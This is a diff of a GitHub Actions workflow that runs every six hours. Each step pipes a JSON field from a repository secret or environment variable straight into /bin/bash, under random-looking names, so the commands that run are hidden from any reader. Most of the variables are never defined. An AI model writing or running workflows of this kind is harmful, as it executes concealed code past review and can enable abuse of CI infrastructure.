@@ -1,8 +1,9 @@
 name: gxlovegao
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
+    - cron: '22 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: gxlovegao
         env:
-          vx46: ${{ secrets.vx46 }}
+          msg3040: ${{ secrets.msg3040 }}
         run: |
-          echo $vx46 | jq -r .xbj4 | /bin/bash
-          echo $j2032 | jq -r .ehm1388 | /bin/bash
-          echo $famf56509 | jq -r .pv654 | /bin/bash
-          echo $i87621 | jq -r .u4 | /bin/bash
-          echo $boy6 | jq -r .vwz91 | /bin/bash
-          echo $iu16 | jq -r .tdp9 | /bin/bash
-          echo $uxk0 | jq -r .jxcuy4 | /bin/bash
-          echo $smodl9 | jq -r .jc04928 | /bin/bash
-          echo $qqk735 | jq -r .xkib5 | /bin/bash
-          echo $czbfc3 | jq -r .f904 | /bin/bash
+          echo $msg3040 | jq -r .k3 | /bin/bash
+          echo $yjbxb7 | jq -r .i674 | /bin/bash
+          echo $rd002 | jq -r .rn899 | /bin/bash
+          echo $cvam69 | jq -r .mtgl3656 | /bin/bash
+          echo $kyx2818 | jq -r .esefb532 | /bin/bash
+          echo $m546 | jq -r .mknrw585 | /bin/bash
+          echo $cstj56056 | jq -r .a703 | /bin/bash
+          echo $au2534 | jq -r .cl24462 | /bin/bash
+          echo $mhxq016 | jq -r .iz047 | /bin/bash
+          echo $eylj53 | jq -r .vinn2 | /bin/bash
+          echo $sd20007 | jq -r .huws65397 | /bin/bash
+          echo $m448 | jq -r .jlybd2 | /bin/bash
+          echo $kmfsb1 | jq -r .wobx5403 | /bin/bash
 
